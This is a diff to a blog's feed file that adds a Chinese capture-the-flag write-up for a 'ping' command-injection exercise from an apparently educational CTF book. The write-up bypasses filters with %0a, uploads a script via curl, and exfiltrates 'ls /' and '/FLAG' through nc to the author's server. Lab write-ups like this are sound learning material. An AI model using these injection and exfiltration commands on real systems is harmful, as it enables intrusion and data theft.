@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>N1Book-死亡ping命令</title>
+      <link href="/blog/2021/01/29/n1book-si-wang-ping-ming-ling/"/>
+      <url>/blog/2021/01/29/n1book-si-wang-ping-ming-ling/</url>
+      
+        <content type="html"><![CDATA[<h1 id="《从0到1：CTFer成长之路》配套题目"><a href="#《从0到1：CTFer成长之路》配套题目" class="headerlink" title="《从0到1：CTFer成长之路》配套题目"></a>《从0到1：CTFer成长之路》配套题目</h1><p>做的好烦躁！！！刚开始在ctfhub上复现，然后环境有问题。后又在buu复现成功</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://i.loli.net/2021/01/30/u9N6O8kJm7xbdLn.png" alt="1.png"></p><h2 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h2><p><img src="https://i.loli.net/2021/01/30/XAP1WqnaucoQl74.png" alt="2.png"></p><p>过滤了一些符号，用%0a截断可以执行命令</p><p><img src="https://i.loli.net/2021/01/30/6w1hSsZMu8WLtAE.png" alt="3.png"></p><p>但回显只有成功和失败，无数据，所以想到需要将结果外带到vps上</p><h2 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h2><p>先说个坑，这道题过滤了冒号。。。一开始是用python开http服务的。然后传文件发现。。。端口处出现冒号不知道怎么绕过</p><p><img src="https://i.loli.net/2021/01/30/qfkpnv1oNYJFlPA.png" alt="4.png"></p><p>然后我就去自己web根目录测试了。。。</p><p>在自己vps上/var/www/html下写一个1.sh文件，内容为<code>ls / | nc vps地址 后续监听端口 </code></p><p>然后将此文件通过curl的方式上传到题目环境下的/tmp目录下</p><p><img src="https://i.loli.net/2021/01/30/OjFXDre25dgS3tR.png" alt="10.png"></p><h2 id="给权限"><a href="#给权限" class="headerlink" title="给权限"></a>给权限</h2><p>反正是做题就直接无脑777</p><p><code>127.0.0.1%0achmod 777 /tmp/1.sh</code></p><h2 id="带出数据"><a href="#带出数据" class="headerlink" title="带出数据"></a>带出数据</h2><p>vps执行<code>nc -lvp 端口</code>监听。然后执行该文件即可</p><p><code>127.0.0.1%0ash /tmp/1.sh</code></p><p>即可<code>ls /</code>的数据传回服务器</p><p><img src="https://i.loli.net/2021/01/30/PLJl8RWdhDZacNF.png" alt="11.png"></p><p>修改vps上1.sh文件的内容为<code>cat /FLAG | nc ip port</code></p><p>重复之前的操作。通过curl上传文件，给权限，vps监听，运行1.sh即可拿到flag</p><p><img src="https://i.loli.net/2021/01/30/GAdVHPp8Z4yNjrI.png" alt="14.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web安全 </category>
+          
+          <category> 刷题记录 </category>
+          
+          <category> buu刷题记录 </category>
+          
+          <category> 从0到1：CTFer成长之路》配套题目 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 命令执行 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>FBCTF2019-RCEService</title>
       <link href="/blog/2021/01/29/fbctf2019-rceservice/"/>
       <url>/blog/2021/01/29/fbctf2019-rceservice/</url>
@@ -50,8 +81,6 @@
           
           <category> ctfhub刷题记录 </category>
           
-          <category> 从0到1：CTFer成长之路》配套题目 </category>
-          
       </categories>
       
       
@@ -83,7 +112,7 @@
           
           <category> ctfhub刷题记录 </category>
           
-          <category> 从0到1：CTFer成长之路》配套题目 </category>
+          <category> 《从0到1：CTFer成长之路》配套题目 </category>
           
       </categories>
       
@@ -114,7 +143,7 @@
           
           <category> ctfhub刷题记录 </category>
           
-          <category> 从0到1：CTFer成长之路》配套题目 </category>
+          <category> 《从0到1：CTFer成长之路》配套题目 </category>
           
       </categories>
       
@@ -145,7 +174,7 @@
           
           <category> ctfhub刷题记录 </category>
           
-          <category> 从0到1：CTFer成长之路》配套题目 </category>
+          <category> 《从0到1：CTFer成长之路》配套题目 </category>
           
       </categories>
       
@@ -178,7 +207,7 @@
           
           <category> ctfhub刷题记录 </category>
           
-          <category> 从0到1：CTFer成长之路》配套题目 </category>
+          <category> 《从0到1：CTFer成长之路》配套题目 </category>
           
       </categories>
       
@@ -209,7 +238,7 @@
           
           <category> ctfhub刷题记录 </category>
           
-          <category> 从0到1：CTFer成长之路》配套题目 </category>
+          <category> 《从0到1：CTFer成长之路》配套题目 </category>
           
       </categories>
       
